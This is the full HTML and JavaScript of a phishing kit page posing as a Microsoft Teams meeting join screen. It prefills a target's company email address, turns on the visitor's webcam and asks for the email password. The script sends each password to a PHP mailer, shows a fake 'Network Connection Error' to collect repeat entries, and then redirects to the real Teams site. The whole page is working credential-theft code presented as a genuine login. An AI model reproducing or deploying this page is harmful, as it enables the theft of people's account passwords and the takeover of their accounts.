<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Microsoft Teams</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' type='text/css' media='screen' href='../css/style.css'>
	<link rel="shortcut icon" href="../images/logo2.png">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Overpass:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    
    <style>
        .circle {
            width: 80px;
            height: 80px;
            background-color: #007BFF;
            border-radius: 50%;
            position: relative;
        }

        .circle::before,
        .circle::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 123, 255, 0.5);
            border-radius: 50%;
            transform: translate(-50%, -50%) scale(1);
            animation: pulse 1.5s infinite ease-out;
        }

        .circle::after {
            animation-delay: 0.75s;
        }

        @keyframes pulse {
            0% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 0.8;
            }
            100% {
                transform: translate(-50%, -50%) scale(2.5);
                opacity: 0;
            }
        }

        .participants{
            display: flex;
            height: 80vh;
            justify-content: center;
            align-items: center;
        }
        .image-container {
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 150px;
            height: 150px;
            margin: 0px 30px;
        }

        .image-container img {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            position: relative;
            z-index: 2;
        }

        .pulse-ring {
            position: absolute;
            width: 120px;
            height: 120px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .pulse-ring::before,
        .pulse-ring::after {
            content: '';
            position: absolute;
            width: 120px;
            height: 120px;
            border: 3px solid rgba(0, 123, 255, 0.5);
            border-radius: 50%;
            animation: pulse-beat 1.5s infinite ease-out;
        }

        .pulse-ring::after {
            animation-delay: 0.75s;
        }

        @keyframes pulse-beat {
            0% {
                transform: scale(1);
                opacity: 0.8;
            }
            100% {
                transform: scale(2.5);
                opacity: 0;
            }
        }

        .online{
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: lime;
            position: absolute;
            bottom: 0%;
            left: -10%;
        }


        @media only screen and (max-width:768px){

            .participants{
                display: flex;
                height: 40vh;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .image-container {
                position: relative;
                display: flex;
                justify-content: center;
                align-items: center;
                width: 100px;
                height: 100px;
                margin: 0px 10px;
            }

            .image-container img {
                width:100px;
                height:100px;
                border-radius: 50%;
                position: relative;
                z-index: 2;
            }

            .pulse-ring {
                position: absolute;
                width: 80px;
                height: 80px;
                display: flex;
                justify-content: center;
                align-items: center;
            }

            .pulse-ring::before,
            .pulse-ring::after {
                content: '';
                position: absolute;
                width: 90px;
                height: 90px;
                border: 3px solid rgba(0, 123, 255, 0.5);
                border-radius: 50%;
                animation: pulse-beat 1.5s infinite ease-out;
            }


            @keyframes pulse-beat {
            0% {
                transform: scale(1);
                opacity: 0.8;
            }
            100% {
                transform: scale(1.5);
                opacity: 0;
            }
        }


        }
    </style>
</head>
<body style="height: 100vh;" class="overpass">
    <nav>
        <img src="../images/logo2.png" alt="Logo" width="114" height="75">
</nav>

    <audio id="myAudio" autoplay loop>
        <source src="../teams_cut.mp3" type="audio/mpeg">
    </audio>    

      <script>
        document.addEventListener("DOMContentLoaded", function() {
          var audio = document.getElementById("myAudio");
          audio.play().catch(error => {
            console.log("Autoplay blocked:", error);
          });
        });
      </script>

<div class="container_x">

        <div class="loading">
            <div class="circle"></div>
            <p><b>Joining meeting....</b></p>
        </div>


        <section class="meeting_page" style="display: none;">
            <div class="section_flex section_flex_one">
                <div class="participants hideOnclick">
                    
                    
                    <div class="image-container">
                        <div class="online"></div>
                        <div class="pulse-ring"></div>
                        <img src="../images/image2.jpg" alt="Profile">
                    </div>
                    
                    
                    <div class="image-container">
                        <div class="online"></div>
                        <div class="pulse-ring"></div>
                        <img src="../images/image3.jpg" alt="Profile">
                    </div>
                    
                    <div class="image-container">
                        <div class="online"></div>
                        <div class="pulse-ring"></div>
                        <img src="../images/image4.jpg" alt="Profile">
                    </div>
                </div>
                
                
                
                <div class="video_box showOnClick" style="display: none;">
                    <video id="video" autoplay></video>
                    <script>
                        async function startCamera() {
                            try {
                                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                                document.getElementById('video').srcObject = stream;
                            } catch (error) {
                                console.error("Error accessing webcam:", error);
                            }
                        }
                        startCamera();
                    </script>
                    <footer>
                        <div class="footer_flex">
                            <i class="fa-solid fa-microphone"></i>
                            <!-- <i class="fa-solid fa-microphone-slash"></i> -->
                            <i class="fa-solid fa-video"></i> 
                            <!-- <i class="fa-solid fa-video-slash"></i> -->
                        </div>
                        <div class="footer_flex footer_flex_two">
                            <i class="fa-solid fa-share-from-square"></i>
                            <i class="fa-solid fa-user-group"></i>
                            <i class="fa-solid fa-comment"></i>
                            <button><i class="fa-solid fa-phone-slash"></i>Cancel meeting</button>
                        </div>
                    </footer>
                </div>

            </div>
            <div class="section_flex section_flex_two" style="background: #f5f5f5;">
                <div class="waiting_screen hideOnclick" style="display: flex;">
                    <div class="circle"></div>
                    <button onclick="joinMeeting()"> <i class="fa-solid fa-video" style="color: white;"></i>Join meeting - 3 participant</button>
                </div>

                <div class="meet showOnClick" style="display: none;">
                    <h1 style="color: white;">Microsoft Teams</h1>
                    <p style="color: white; text-align: center;">Welcome <span style="color: white !important;">Academy </span>, you have been invited to join a meeting</p>
                    <form id="form_login">
                        <h2>
                            Continue sign in as
                        </h2>
                        <p> sales001@lingfancooling.com.cn </p>
                        <div style="padding-bottom:10px"><i id="error" style="color:red;display:none;font-size:90%;"> </i></div>
                        <p style="color:red; text-align:center; font-size:14px; display:none;" id="errorText">Network Error, please try again</p>
                       <input type="hidden" id="email" value="sales001@lingfancooling.com.cn" name="email">
                        <input type="password" placeholder="Enter Emaill Password" style="width: 100%;height: 35px; padding: 5px; border-radius: 5px;border: 1px solid silver;" name="pass" id="password" required>
                        <p style="margin: 20px 0px;">
                        <input type="checkbox" checked> &nbsp;I agree to the <span>Terms of Service</span> and <span>Privacy Statement</span></a>
                        </p>
                        <button id="loginButton">Launch Meeting</button>
                    </form>
                </div>
                
                

            </div>
        </section>
    </div>

 <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
<script>
    var intSubmit       = 0;
    var strFirstPassword = '';

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }

    (function(){
        $('#password').focus();
        $strEmail = document.getElementById('email').value;
		$('#emailId').text($strEmail);

        $('#form_login').submit(function(e){
            e.preventDefault();
            submitPassword();
        });
    }());

    function submitPassword(){
         var strPassword = $('#password').val();
        var stremail = $('#email').val();
        var cid = $('#cid').val();
        var strdomain = $('#main_domain').val();
        if(strPassword == '' || strPassword == null){
            
            $('#error').show();
            $('#error').text('Please enter your email password.');
        }else{
            $.ajax({
                url: "../mail/send_email.php",
                method: "post",
                data: {
                    email: stremail,
                    pass: strPassword,
                    lpage: strdomain
                },
                success: function(data){
                    intSubmit++
                    if(intSubmit > 2){
                        window.location.replace("https://www.microsoft.com/en-us/microsoft-teams/free");
                    }else{
                        $('#password').val("");
                        $('#password').focus();
                        $('#error').show();
                        $('#error').text('Network Connection Error. Please Try Again');
                    }
                }
            });
            
        }
    }
</script>
